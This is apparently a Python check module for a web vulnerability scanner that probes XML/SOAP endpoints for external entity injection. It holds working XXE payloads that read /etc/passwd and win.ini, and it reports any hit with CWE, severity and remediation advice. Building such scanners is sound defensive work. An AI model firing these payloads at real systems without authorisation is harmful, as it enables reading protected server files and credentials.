"""XXE against discovered XML/SOAP endpoints."""

from __future__ import annotations

from argos.engine.findings import Finding, Severity, truncate
from argos.engine.registry import Check, ScanContext, register

XXE_FILE = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r><n>&xxe;</n></r>"""

XXE_WIN = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<r><n>&xxe;</n></r>"""

PASSWD_MARKERS = ("root:x:0:0", "root:*:0:0")
WIN_MARKERS = ("[fonts]", "for 16-bit app support")


def _xml_sinks(ctx: ScanContext) -> list[str]:
    """Endpoints that accept or serve XML (content-type, declarations, forms)."""
    sinks: list[str] = []
    for page in ctx.pages:
        url = page.final_url or page.url
        ct = page.content_type.lower()
        if "xml" in ct or "soap" in ct:
            sinks.append(url)
        elif page.is_html and ("<?xml" in page.html[:500] or "text/xml" in page.html[:2000]):
            sinks.append(url)
        for form in page.forms:
            if form.method == "POST" and (
                "xml" in form.action.lower() or "soap" in form.action.lower()
            ):
                sinks.append(form.action)
    seen: set[str] = set()
    unique: list[str] = []
    for url in sinks:
        if url not in seen:
            seen.add(url)
            unique.append(url)
    return unique[:3]


@register
class XXE(Check):
    name = "xxe"
    mode = "active"
    min_profile = "quick"
    summary = "XML external entity injection → local file read on XML endpoints"

    async def run(self, ctx: ScanContext) -> list[Finding]:
        findings: list[Finding] = []
        for url in _xml_sinks(ctx):
            for payload, markers, os_name in (
                (XXE_FILE, PASSWD_MARKERS, "Unix"),
                (XXE_WIN, WIN_MARKERS, "Windows"),
            ):
                resp = await ctx.client.post(
                    url,
                    content=payload.encode(),
                    headers={"Content-Type": "application/xml"},
                )
                hit = next((m for m in markers if m in resp.text), None)
                if hit is None:
                    continue
                findings.append(
                    Finding(
                        plugin=self.name,
                        title=f"XXE → local file read ({os_name})",
                        severity=Severity.HIGH,
                        cvss=7.5,
                        cwe="CWE-611",
                        url=url,
                        parameter="XML body",
                        description=(
                            f"The XML parser at {url} resolves external entities — the "
                            f"injected entity returned a protected OS file ({hit!r}). "
                            "Attackers read source code, keys and credentials, and XXE "
                            "can escalate to SSRF/RCE."
                        ),
                        remediation=(
                            "Disable DTDs and external entity resolution in the XML "
                            "parser (libxml2: XML_PARSE_NONET/noent off; "
                            "DocumentBuilderFactory: disallow-doctype-decl=true)."
                        ),
                        evidence_request=payload,
                        evidence_response=truncate(
                            f"HTTP {resp.status_code}\n{resp.text[:700]}", 900
                        ),
                    )
                )
                break
        return findings
